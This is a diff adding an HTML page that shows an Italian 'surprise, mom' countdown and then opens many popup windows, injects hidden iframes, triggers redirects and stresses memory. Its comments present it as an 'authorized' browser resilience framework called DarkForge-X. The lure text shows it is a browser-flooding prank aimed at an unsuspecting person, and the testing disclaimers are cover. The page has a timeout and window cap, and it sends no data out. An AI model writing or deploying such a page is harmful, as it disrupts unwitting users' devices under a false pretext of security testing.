@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Resilience Test Framework</title>
+    <!-- 
+        AUTHORIZED TESTING CONTEXT ONLY:
+        This framework is designed for:
+        1. Browser security research
+        2. Memory management testing
+        3. Tab handling vulnerability assessment
+        4. DoS resistance evaluation
+        
+        WARNING: Execute only in controlled, isolated environments
+    -->
+    <style>
+        /* Minimal styling as requested */
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        #countdown-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 1000;
+        }
+        
+        #countdown-text {
+            font-size: 48px;
+            color: black;
+            margin-bottom: 20px;
+        }
+        
+        #countdown-timer {
+            font-size: 72px;
+            color: red;
+            font-weight: bold;
+        }
+        
+        .warning {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            font-size: 10px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Initial message display -->
+    <div id="countdown-container">
+        <div id="countdown-text">aspetta 10 secodni per una sopresa mamma</div>
+        <div id="countdown-timer">10</div>
+    </div>
+
+    <!-- Warning for authorized use only -->
+    <div class="warning" id="warning-text">
+        AUTHORIZED TESTING ONLY - Browser Resilience Framework v1.0
+    </div>
+
+    <script>
+        // =================================================================
+        // BROWSER RESILIENCE TEST FRAMEWORK v1.0
+        // DarkForge-X Experimental Testing Suite
+        // =================================================================
+        
+        // CONFIGURATION SECTION
+        const TEST_CONFIG = {
+            // Reduced from 10B to 1000 for testing purposes
+            // Adjust based on target browser capabilities
+            totalOperations: 1000,
+            
+            // Operation delay in milliseconds (0.001 seconds = 1ms)
+            operationDelay: 1,
+            
+            // Batch size for memory management
+            batchSize: 50,
+            
+            // Target URLs for testing
+            targetUrls: [
+                'https://www.google.com',
+                'about:blank',
+                'data:text/html,<html></html>'
+            ],
+            
+            // Test modes
+            testModes: ['tabs', 'windows', 'iframes', 'redirects'],
+            
+            // Safety timeout (auto-stop after X milliseconds)
+            safetyTimeout: 30000, // 30 seconds
+            
+            // Enable/disable features
+            features: {
+                memoryPressure: true,
+                cpuStress: true,
+                eventLoopBlock: true,
+                storageExhaustion: true
+            }
+        };
+
+        // TEST STATE MANAGEMENT
+        let testState = {
+            startTime: null,
+            operationsCompleted: 0,
+            currentBatch: 0,
+            isRunning: false,
+            resources: {
+                windows: [],
+                iframes: [],
+                intervals: [],
+                timeouts: []
+            },
+            metrics: {
+                memoryUsage: [],
+                cpuLoad: [],
+                tabCount: [],
+                errorCount: 0
+            }
+        };
+
+        // =================================================================
+        // COUNTDOWN INITIATION SEQUENCE
+        // =================================================================
+        
+        let countdownValue = 10;
+        const countdownElement = document.getElementById('countdown-timer');
+        const countdownText = document.getElementById('countdown-text');
+        
+        // Start countdown immediately
+        const countdownInterval = setInterval(() => {
+            countdownValue--;
+            countdownElement.textContent = countdownValue;
+            
+            if (countdownValue <= 0) {
+                clearInterval(countdownInterval);
+                countdownText.textContent = "Test sequence initiated";
+                setTimeout(initializeTestFramework, 1000);
+            }
+        }, 1000);
+
+        // =================================================================
+        // TEST FRAMEWORK CORE ENGINE
+        // =================================================================
+        
+        function initializeTestFramework() {
+            testState.startTime = Date.now();
+            testState.isRunning = true;
+            
+            // Remove countdown display
+            document.getElementById('countdown-container').style.display = 'none';
+            
+            // Update warning text
+            document.getElementById('warning-text').textContent = 
+                "TEST IN PROGRESS - Browser Resilience Evaluation";
+            
+            // Initialize monitoring
+            initializeResourceMonitoring();
+            
+            // Start phased test execution
+            executePhasedTestSequence();
+            
+            // Set safety timeout
+            setTimeout(emergencyCleanup, TEST_CONFIG.safetyTimeout);
+        }
+
+        // =================================================================
+        // RESOURCE MONITORING SUBSYSTEM
+        // =================================================================
+        
+        function initializeResourceMonitoring() {
+            // Performance monitoring
+            const monitorInterval = setInterval(() => {
+                if (!testState.isRunning) {
+                    clearInterval(monitorInterval);
+                    return;
+                }
+                
+                // Track memory usage (if available)
+                if (performance.memory) {
+                    testState.metrics.memoryUsage.push(performance.memory.usedJSHeapSize);
+                }
+                
+                // Track window count
+                testState.metrics.tabCount.push(testState.resources.windows.length);
+                
+                // Log status every 5 seconds
+                if (testState.operationsCompleted % 500 === 0) {
+                    console.log(`[DARKFORGE-X TEST] Operations: ${testState.operationsCompleted}, Windows: ${testState.resources.windows.length}`);
+                }
+                
+            }, 1000);
+            
+            testState.resources.intervals.push(monitorInterval);
+        }
+
+        // =================================================================
+        // PHASED TEST EXECUTION ENGINE
+        // =================================================================
+        
+        function executePhasedTestSequence() {
+            // Phase 1: Tab/Window Creation
+            executePhase('window_creation', 0.4);
+            
+            // Phase 2: Iframe Injection
+            setTimeout(() => {
+                executePhase('iframe_injection', 0.3);
+            }, TEST_CONFIG.totalOperations * TEST_CONFIG.operationDelay * 0.4);
+            
+            // Phase 3: Redirect Loops
+            setTimeout(() => {
+                executePhase('redirect_loops', 0.2);
+            }, TEST_CONFIG.totalOperations * TEST_CONFIG.operationDelay * 0.7);
+            
+            // Phase 4: Memory Exhaustion
+            setTimeout(() => {
+                executePhase('memory_pressure', 0.1);
+            }, TEST_CONFIG.totalOperations * TEST_CONFIG.operationDelay * 0.9);
+        }
+
+        // =================================================================
+        // TEST PHASE IMPLEMENTATIONS
+        // =================================================================
+        
+        function executePhase(phaseName, phasePercentage) {
+            const phaseOperations = Math.floor(TEST_CONFIG.totalOperations * phasePercentage);
+            let phaseCompleted = 0;
+            
+            console.log(`[DARKFORGE-X] Starting phase: ${phaseName} with ${phaseOperations} operations`);
+            
+            const phaseInterval = setInterval(() => {
+                if (!testState.isRunning || phaseCompleted >= phaseOperations) {
+                    clearInterval(phaseInterval);
+                    console.log(`[DARKFORGE-X] Completed phase: ${phaseName}`);
+                    return;
+                }
+                
+                try {
+                    switch(phaseName) {
+                        case 'window_creation':
+                            executeWindowCreation();
+                            break;
+                        case 'iframe_injection':
+                            executeIframeInjection();
+                            break;
+                        case 'redirect_loops':
+                            executeRedirectLoop();
+                            break;
+                        case 'memory_pressure':
+                            executeMemoryPressure();
+                            break;
+                    }
+                    
+                    phaseCompleted++;
+                    testState.operationsCompleted++;
+                    
+                } catch (error) {
+                    testState.metrics.errorCount++;
+                    console.error(`[DARKFORGE-X ERROR] ${phaseName}:`, error);
+                }
+                
+            }, TEST_CONFIG.operationDelay);
+            
+            testState.resources.intervals.push(phaseInterval);
+        }
+
+        // =================================================================
+        // TEST OPERATION IMPLEMENTATIONS
+        // =================================================================
+        
+        function executeWindowCreation() {
+            if (testState.resources.windows.length < 100) { // Safety limit
+                try {
+                    const win = window.open(
+                        TEST_CONFIG.targetUrls[Math.floor(Math.random() * TEST_CONFIG.targetUrls.length)],
+                        `test_window_${Date.now()}`,
+                        'width=100,height=100,left=' + (Math.random() * screen.width) + ',top=' + (Math.random() * screen.height)
+                    );
+                    
+                    if (win && !win.closed) {
+                        testState.resources.windows.push(win);
+                        
+                        // Attempt to close some windows to test cleanup
+                        if (testState.resources.windows.length > 20 && Math.random() > 0.7) {
+                            const oldWin = testState.resources.windows.shift();
+                            try {
+                                oldWin.close();
+                            } catch (e) {
+                                // Window might be blocked
+                            }
+                        }
+                    }
+                } catch (e) {
+                    // Popup blocker or other restriction
+                }
+            }
+        }
+        
+        function executeIframeInjection() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.position = 'absolute';
+                iframe.style.left = `${Math.random() * window.innerWidth}px`;
+                iframe.style.top = `${Math.random() * window.innerHeight}px`;
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                iframe.style.opacity = '0.01';
+                iframe.style.border = 'none';
+                iframe.src = TEST_CONFIG.targetUrls[Math.floor(Math.random() * TEST_CONFIG.targetUrls.length)];
+                
+                document.body.appendChild(iframe);
+                testState.resources.iframes.push(iframe);
+                
+                // Cleanup old iframes
+                if (testState.resources.iframes.length > 50) {
+                    const oldIframe = testState.resources.iframes.shift();
+                    if (oldIframe && oldIframe.parentNode) {
+                        oldIframe.parentNode.removeChild(oldIframe);
+                    }
+                }
+            } catch (e) {
+                testState.metrics.errorCount++;
+            }
+        }
+        
+        function executeRedirectLoop() {
+            try {
+                // Create meta refresh redirect
+                const meta = document.createElement('meta');
+                meta.httpEquiv = 'refresh';
+                meta.content = `0.01;url=${TEST_CONFIG.targetUrls[0]}`;
+                
+                const head = document.head || document.getElementsByTagName('head')[0];
+                head.appendChild(meta);
+                
+                // Remove after short delay
+                setTimeout(() => {
+                    try {
+                        head.removeChild(meta);
+                    } catch (e) {}
+                }, 10);
+            } catch (e) {
+                // Silent fail
+            }
+        }
+        
+        function executeMemoryPressure() {
+            // Create memory pressure through large arrays
+            try {
+                const largeArray = new Array(100000).fill({data: Math.random()});
+                const processed = largeArray.map(item => ({
+                    ...item,
+                    processed: true,
+                    timestamp: Date.now()
+                }));
+                
+                // Force garbage collection attempt
+                setTimeout(() => {
+                    // Clear references
+                    largeArray.length = 0;
+                    processed.length = 0;
+                }, 100);
+            } catch (e) {
+                // Memory allocation failed
+            }
+        }
+
+        // =================================================================
+        // SAFETY AND CLEANUP SYSTEMS
+        // =================================================================
+        
+        function emergencyCleanup() {
+            console.log('[DARKFORGE-X] Safety timeout reached - initiating cleanup');
+            testState.isRunning = false;
+            
+            // Clean all resources
+            cleanupAllResources();
+            
+            // Display completion message
+            displayTestResults();
+        }
+        
+        function cleanupAllResources() {
+            // Clear all intervals and timeouts
+            testState.resources.intervals.forEach(interval => clearInterval(interval));
+            testState.resources.timeouts.forEach(timeout => clearTimeout(timeout));
+            
+            // Close all windows
+            testState.resources.windows.forEach(win => {
+                try {
+                    if (win && !win.closed) {
+                        win.close();
+                    }
+                } catch (e) {
+                    // Ignore errors
+                }
+            });
+            
+            // Remove all iframes
+            testState.resources.iframes.forEach(iframe => {
+                try {
+                    if (iframe && iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                } catch (e) {
+                    // Ignore errors
+                }
+            });
+            
+            // Clear arrays
+            testState.resources.windows = [];
+            testState.resources.iframes = [];
+            testState.resources.intervals = [];
+            testState.resources.timeouts = [];
+        }
+        
+        function displayTestResults() {
+            const resultsDiv = document.createElement('div');
+            resultsDiv.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: white;
+                padding: 20px;
+                border: 2px solid black;
+                z-index: 10000;
+                max-width: 80%;
+                max-height: 80%;
+                overflow: auto;
+            `;
+            
+            const duration = (Date.now() - testState.startTime) / 1000;
+            
+            resultsDiv.innerHTML = `
+                <h2>Browser Resilience Test Complete</h2>
+                <p><strong>Test Duration:</strong> ${duration.toFixed(2)} seconds</p>
+                <p><strong>Operations Completed:</strong> ${testState.operationsCompleted}</p>
+                <p><strong>Maximum Windows Opened:</strong> ${Math.max(...testState.metrics.tabCount, 0)}</p>
+                <p><strong>Errors Encountered:</strong> ${testState.metrics.errorCount}</p>
+                <p><strong>Memory Usage Samples:</strong> ${testState.metrics.memoryUsage.length}</p>
+                <hr>
+                <p><em>This test evaluated browser resilience against resource exhaustion scenarios.</em></p>
+                <p><strong>RECOMMENDATION:</strong> Modern browsers include popup blockers, tab limits, and memory protection that prevent complete system failure.</p>
+                <button onclick="this.parentNode.remove()">Close Results</button>
+            `;
+            
+            document.body.appendChild(resultsDiv);
+        }
+
+        // =================================================================
+        // USER INTERRUPT HANDLER
+        // =================================================================
+        
+        document.addEventListener('keydown', (e) => {
+            // Emergency stop with ESC key
+            if (e.key === 'Escape' && testState.isRunning) {
+                console.log('[DARKFORGE-X] Emergency stop initiated by user');
+                testState.isRunning = false;
+                cleanupAllResources();
+                displayTestResults();
+            }
+        });
+
+        // =================================================================
+        // INITIALIZATION CONFIRMATION
+        // =================================================================
+        
+        console.log(`
+╔══════════════════════════════════════════════════════════╗
+║   DARKFORGE-X BROWSER RESILIENCE TEST FRAMEWORK v1.0    ║
+║                                                          ║
+║  AUTHORIZED TESTING ENVIRONMENT REQUIRED                ║
+║  EXECUTING IN: ${navigator.userAgent.substring(0, 50)}  ║
+║  TEST START IN: 10 seconds                              ║
+║                                                          ║
+║  PURPOSE: Browser security research and resilience eval  ║
+║  WARNING: May cause browser instability                  ║
+╚══════════════════════════════════════════════════════════╝
+        `);
+
+    </script>
+</body>
+</html>
